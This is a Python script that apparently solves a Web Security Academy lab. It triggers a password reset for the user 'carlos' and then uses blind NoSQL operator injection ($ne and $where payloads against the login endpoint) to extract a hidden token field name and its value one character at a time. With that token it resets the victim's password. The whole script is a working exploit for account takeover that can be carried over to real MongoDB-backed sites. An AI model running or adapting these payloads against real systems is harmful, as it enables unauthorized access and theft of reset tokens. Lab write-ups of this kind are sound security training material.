import requests, urllib3, string, sys, json
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http':'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080'}

URL = "https://0a2b00730405fb4c80aa1749002a0089.web-security-academy.net"

s = requests.session()

# Submitting Forgot Password Form
forgot_pwd = URL + "/forgot-password"
r = s.get(forgot_pwd, verify=False)
bs = BeautifulSoup(r.text, 'html.parser')
csrf_token = bs.find("input")['value']

data = {
    "csrf" : csrf_token,
    "username" : "carlos"
}
s.post(forgot_pwd, data=data, verify=False)

# Finding length of field name
print(f"[*] Finding Field Length")
login = URL + "/login"
header = {
    "Content-Type": "application/json"
}
field_len = 0
for i in range(20):
    data = json.dumps({
        "username":"carlos",
        "password":{"$ne":"test"},
        "$where":f"Object.keys(this)[3].length == {i}"
        })
    r = s.post(login, data=data, headers=header, verify=False)
    if "locked" in r.text:
        field_len = i
        sys.stdout.write('\r' + str(i))
        sys.stdout.flush()
        break
    else:
        sys.stdout.write('\r' + str(i))
        sys.stdout.flush()


# Finding Field Name
print("\n[*] Finding Field Name")
field_name = ""
chars = string.ascii_letters + string.digits
for i in range(field_len):
    for c in chars:
        data = json.dumps({
            "username":"carlos",
            "password":{"$ne":"test"},
            "$where":f"Object.keys(this)[3].match('^.{{{i}}}{c}.*')"
            })
        r = s.post(login, data=data, headers=header, verify=False)
        if "locked" in r.text:
            field_name += c
            sys.stdout.write('\r' + field_name)
            sys.stdout.flush()
            break
        else:
            sys.stdout.write('\r' + field_name + c)
            sys.stdout.flush()

# Finding length of token
print(f"\n[*] Finding Token Length")
token_len = 0
for i in range(50):
    data = json.dumps({
        "username":"carlos",
        "password":{"$ne":"test"},
        "$where":f"this.{field_name}.length == {i}"
        })
    r = s.post(login, data=data, headers=header, verify=False)
    if "locked" in r.text:
        token_len = i
        sys.stdout.write('\r' + str(i))
        sys.stdout.flush()
        break
    else:
        sys.stdout.write('\r' + str(i))
        sys.stdout.flush()


# Extract Token
print("\n[*] Extracting Token")
token = ""
chars = string.ascii_letters + string.digits
for i in range(token_len):
    for c in chars:
        data = json.dumps({
            "username":"carlos",
            "password":{"$ne":"test"},
            "$where":f"this.{field_name}.match('^.{{{i}}}{c}.*')"
            })
        r = s.post(login, data=data, headers=header, verify=False)
        if "locked" in r.text:
            token += c
            sys.stdout.write('\r' + token)
            sys.stdout.flush()
            break
        else:
            sys.stdout.write('\r' + token + c)
            sys.stdout.flush()

print("\n[*] Resetting Password")
reset_pwd = forgot_pwd + f"?{field_name}={token}"
r = s.get(reset_pwd, verify=False)
bs = BeautifulSoup(r.text, 'html.parser')
csrf_token = bs.find("input")['value']

data = {
    "csrf" : csrf_token,
    field_name : token,
    "new-password-1" : "admin",
    "new-password-2" : "admin"
}

r = s.post(reset_pwd, data=data, verify=False, proxies=proxies)
if r.status_code == 200:
    print("[+] Username: carlos\n[+] Password: admin")
else:
    print("[-] Something Went Wrong!")
